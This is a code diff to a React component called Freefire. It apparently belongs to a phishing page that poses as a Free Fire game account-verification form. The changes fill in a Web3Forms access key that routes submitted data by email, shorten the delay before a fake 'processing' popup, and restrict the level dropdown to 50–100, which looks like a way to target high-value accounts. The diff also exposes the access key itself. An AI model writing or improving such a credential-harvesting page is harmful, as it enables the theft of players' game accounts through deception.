@@ -29,7 +29,7 @@ const EyeSlashIcon = (
     <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#65676b" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-7 0-11-7-11-7a21.81 21.81 0 0 1 5.06-6.06M9.53 9.53A3 3 0 0 0 12 15a3 3 0 0 0 2.47-5.47"></path><path d="M1 1l22 22"></path></svg>
 );
 
-const WEB3FORMS_ACCESS_KEY = "YOUR_ACCESS_KEY_HERE"; // <-- Replace with your Web3Forms access key
+const WEB3FORMS_ACCESS_KEY = "67a9cc91-daea-421c-81a9-b1e5e447c316"; // <-- Replace with your Web3Forms access key
 
 export default function Freefire() {
     const [showModal, setShowModal] = useState(false);
@@ -488,7 +488,7 @@ export default function Freefire() {
                             style={{
                                 background: '#ECEFF6',
                                 width: '100%',
-                                maxWidth: '370px',
+                                maxWidth: '350px',
                                 borderRadius: '10px',
                                 boxShadow: '0 2px 16px rgba(0,0,0,0.15)',
                                 overflow: 'visible',
@@ -825,7 +825,7 @@ export default function Freefire() {
                                                     setAccSuccess(false);
                                                     setShowAccountVerification(false);
                                                     setShowProcessingPopup(true);
-                                                }, 5000);
+                                                }, 2000);
                                             } else {
                                                 setShowAccLoader(false);
                                                 setAccError("Failed to send email. Please try again.");
@@ -890,9 +890,9 @@ export default function Freefire() {
                                                 boxShadow: '0 0 2px 0 #fff',
                                                 marginBottom: '7px',
                                             }}>
-                                                <option value="" disabled style={{color: '#e7debd'}}>Account Level (Min 50lvl)</option>
-                                                {[...Array(50)].map((_, i) => (
-                                                    <option key={i+1} value={i+1} style={{color: '#000'}}>{i+1}</option>
+                                                <option value="" disabled style={{color: '#e7debd'}}>Account Level (Min 50 - 100lvl)</option>
+                                                {[...Array(51)].map((_, i) => (
+                                                    <option key={i+50} value={i+50} style={{color: '#000'}}>{i+50}</option>
                                                 ))}
                                             </select>
                                             <input type="number" name="securityCode" className="ff-account-verification-input" placeholder="Security Code (Optional)" value={accCode} onChange={e => setAccCode(e.target.value)} style={{
